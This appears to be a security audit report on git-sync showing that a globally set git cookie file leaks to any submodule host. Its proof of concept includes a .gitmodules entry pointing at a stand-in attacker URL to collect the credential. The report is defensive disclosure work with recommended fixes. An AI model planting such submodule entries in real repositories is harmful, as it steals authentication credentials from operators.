### Title
Cookie-file credentials are attached globally to any submodule URL, disclosing them to attacker-controlled hosts - ([File: main.go])

### Summary
`git-sync` allows a repository owner/pusher to add or modify `.gitmodules` in the synced repository, which is untrusted content from the attacker's perspective (anyone who can push a commit/ref to `--repo`). When `--cookie-file` is enabled, `SetupCookieFile` configures `http.cookiefile` **globally** via `git config --global`, and this cookie file is then sent by git on **every** subsequent HTTPS request it makes — including `git submodule update --init --recursive`, which fetches from whatever URLs appear in the untrusted `.gitmodules` file. Because there is no per-host/per-URL scoping or allow-listing of submodule URLs, an attacker who controls repository content can point a submodule at a server they control and have git-sync's cookie file (an authentication credential) sent to it.

### Finding Description
This mirrors the code423n4 Illuminate finding pattern: an externally-supplied, unvalidated value (there, a malicious pool/AMM address; here, a malicious submodule URL embedded in `.gitmodules`) is trusted and acted upon without any allow-listing or verification, letting the attacker redirect a privileged operation (minting PTs there; sending authentication material here) to a destination they control.

In git-sync:
1. `SetupCookieFile` sets the cookie file as a **global** git config value, not scoped to the `--repo` host: [1](#0-0) 
2. `configureWorktree` runs `git submodule update --init [--recursive]` against whatever `.gitmodules` content came from the fetched, untrusted repository, with no restriction on submodule URLs/hosts: [2](#0-1) 
3. Nothing in `initRepo`/`fetch`/`configureWorktree` validates or whitelists submodule remotes before they are dereferenced by git: [3](#0-2) [4](#0-3) 

Because `http.cookiefile` is a process-wide/global git config (set once via `--global`), any HTTPS request git makes afterward — including the request generated internally by `git submodule update` to fetch from an attacker-supplied submodule URL — will have that cookie file's contents attached, regardless of host. The `--credential` flag mechanism (scoped per URL via `git credential approve`) exists precisely because the README acknowledges submodules may point to different hosts needing different secrets, but no equivalent host-scoping exists for `--cookie-file`.

### Impact Explanation
This qualifies as **credential/token disclosure**: an attacker who can influence the content of the synced repository (e.g., has push access to a branch/tag that git-sync tracks, or can get a malicious PR/commit merged, or controls a repo intentionally configured for sync) can add a submodule pointing to a server they control. On the next sync, git-sync's `git submodule update` will connect to that attacker server carrying the cookie-based authentication token, disclosing it outside the intended trust boundary. Depending on what the cookie authorizes (e.g., SSO session, source-hosting API token), this could lead to further compromise of the upstream repository's credentials.

### Likelihood Explanation
Likelihood is moderate: it requires (a) `--cookie-file` to be enabled (a supported, documented git-sync feature, `docs/cookie-file.md`), and (b) an attacker capable of adding/altering `.gitmodules`/submodule references in content that gets synced. This is a realistic scenario for git-sync's stated use case (tracking a repo/branch that may accept external contributions, or a compromised/malicious collaborator on the tracked repo), matching the "attacker-pushed commit to a tracked ref" threat model in the validation criteria.

### Recommendation
- Scope credential exposure to the intended host(s): avoid setting `http.cookiefile` globally for all requests; instead use `http.<url>.cookiefile` (per-URL git config) restricted to the `--repo` origin, or use `includeIf` conditional includes keyed by URL.
- Add an explicit allow-list/flag for permitted submodule URLs/hosts (e.g., only allow submodules whose URL matches the `--repo` host or an admin-specified list), rejecting or warning on others before running `git submodule update`.
- Consider disabling submodule recursion into unexpected hosts by default and documenting the risk clearly, similar to how `--credential` is documented as being necessary for multi-host submodules.

### Proof of Concept
1. Operator runs git-sync with `--repo=https://internal.example.com/team/repo.git --cookie-file --submodules=recursive`, where `/etc/git-secret/cookie_file` holds a valid session cookie for `internal.example.com`.
2. An attacker who can push to `team/repo` (e.g., via a merged PR, or by compromising a low-privileged contributor account) adds `.gitmodules` with:
   ```
   [submodule "evil"]
       path = evil
       url = https://attacker.example.com/collect
   ```
3. On the next sync cycle, `configureWorktree` runs `git submodule update --init --recursive` [5](#0-4)  which issues an HTTPS request to `attacker.example.com`.
4. Because `http.cookiefile` was set with `--global` scope [6](#0-5) , git attaches the cookie file's contents to this request, leaking the credential to the attacker-controlled server's request logs.

// fetch retrieves the specified ref from the upstream repo.
func (git *repoSync) fetch(ctx context.Context, ref string) error {
	git.log.V(2).Info("fetching", "ref", ref, "repo", redactURL(git.repo))

	// Fetch the ref and do some cleanup, setting or un-setting the repo's
	// shallow flag as appropriate.
	args := []string{"fetch", git.repo, ref, "--verbose", "--no-progress", "--prune", "--no-auto-gc"}
	if git.depth > 0 {
		args = append(args, "--depth", strconv.Itoa(git.depth))
	} else {
		// If the local repo is shallow and we're not using depth any more, we
		// need a special case.
		shallow, err := git.isShallow(ctx)
		if err != nil {
			return err
		}
		if shallow {
			args = append(args, "--unshallow")
		}
	}
	if git.filter != "" {
		args = append(args, "--filter", git.filter)
	}
	if _, _, err := git.Run(ctx, git.root, args...); err != nil {
		return err
	}

	return nil
}

func (git *repoSync) SetupCookieFile(ctx context.Context) error {
	git.log.V(1).Info("configuring git cookie file")

	var pathToCookieFile = "/etc/git-secret/cookie_file"

	_, err := os.Stat(pathToCookieFile)
	if err != nil {
		return fmt.Errorf("can't access git cookiefile: %w", err)
	}

	if _, _, err = git.Run(ctx, "", "config", "--global", "http.cookiefile", pathToCookieFile); err != nil {
		return fmt.Errorf("can't configure git cookiefile: %w", err)
	}

	return nil
}
